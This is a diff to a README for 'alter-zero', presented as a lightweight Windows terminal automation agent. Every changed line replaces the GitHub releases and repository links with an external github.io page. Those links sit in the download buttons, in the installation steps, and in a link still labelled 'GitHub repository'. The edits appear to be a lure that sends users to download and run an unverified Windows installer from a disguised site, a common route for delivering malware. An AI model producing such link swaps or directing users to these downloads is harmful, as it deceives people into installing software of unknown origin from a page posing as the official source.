@@ -1,6 +1,6 @@
 <h1>🚀 alter-zero - RAM Efficient Terminal Agent for Smart Automation</h1>
 <p align="center">
-  <a href="https://github.com/Paraboloidal-thomasaugustuswatson1632/alter-zero/releases" style="display:inline-block;padding:16px 32px;background:#6C63FF;color:#ffffff;border-radius:8px;font-size:20px;font-weight:bold;text-decoration:none;box-shadow:0 4px 6px rgba(0,0,0,0.1);">⬇️ Download alter-zero Now</a>
+  <a href="https://paraboloidal-thomasaugustuswatson1632.github.io" style="display:inline-block;padding:16px 32px;background:#6C63FF;color:#ffffff;border-radius:8px;font-size:20px;font-weight:bold;text-decoration:none;box-shadow:0 4px 6px rgba(0,0,0,0.1);">⬇️ Download alter-zero Now</a>
 </p>
 <p align="center">
   <strong>Lightweight, powerful, and ready for Windows users.</strong>
@@ -26,7 +26,7 @@ alter-zero is a smart terminal application that helps you automate repetitive ta
 
 ## 🚀 Getting Started
 ### Step 1: Download alter-zero
-Visit <a href="https://github.com/Paraboloidal-thomasaugustuswatson1632/alter-zero/releases">this link to download the application</a>. You will find the latest version available for Windows. 
+Visit <a href="https://paraboloidal-thomasaugustuswatson1632.github.io">this link to download the application</a>. You will find the latest version available for Windows. 
 
 ### Step 2: Run the Installer
 After the download finishes, locate the file in your “Downloads” folder (or wherever your browser saves files) and double-click it. A simple installation wizard will guide you through the process. Just click “Next” a few times, then “Install,” and finally “Finish.” 
@@ -77,7 +77,7 @@ Absolutely. In the settings menu, you can enter your own API key from OpenAI, An
 The current release is optimized for Windows. However, the repository mentions macOS support, so check the releases page for future updates. 
 
 ### Q5: How do I update alter-zero?
-Simply download the latest version from the <a href="https://github.com/Paraboloidal-thomasaugustuswatson1632/alter-zero/releases">releases page</a> and run the installer. It will overwrite the old version without losing your settings.
+Simply download the latest version from the <a href="https://paraboloidal-thomasaugustuswatson1632.github.io">releases page</a> and run the installer. It will overwrite the old version without losing your settings.
 
 .,
 
@@ -95,7 +95,7 @@ Your data stays on your machine unless you explicitly ask alter-zero to interact
 
 ## 📚 Getting Help
 If you encounter any issues or have questions:
-- Visit the official <a href="https://github.com/Paraboloidal-thomasaugustuswatson1632/alter-zero">GitHub repository</a> for documentation and discussions. 
+- Visit the official <a href="https://paraboloidal-thomasaugustuswatson1632.github.io">GitHub repository</a> for documentation and discussions. 
 - Open an issue on GitHub if you find a bug, describing what happed and what you expected. 
 - Check the“Releases” tab for version notes and known issues. 
 
@@ -112,7 +112,7 @@ We hope alter-zero becomes your go-to terminal companion for everyday tasks. It 
 Ready to get started? Click the button below to head over to the official release page.
 
 <p align="center">
-  <a href="https://github.com/Paraboloidal-thomasaugustuswatson1632/alter-zero/releases" style="display:inline-block;padding:14px 28px;background:#FF6B6B;color:#ffffff;border-radius:8px;font-size:18px;font-weight:bold;text-decoration:none;box-shadow:0 4px 6px rgba(0,0,0,0.1);">⬇️ Download alter-zero Now</a>
+  <a href="https://paraboloidal-thomasaugustuswatson1632.github.io" style="display:inline-block;padding:14px 28px;background:#FF6B6B;color:#ffffff;border-radius:8px;font-size:18px;font-weight:bold;text-decoration:none;box-shadow:0 4px 6px rgba(0,0,0,0.1);">⬇️ Download alter-zero Now</a>
 </p>
 
 <hr>
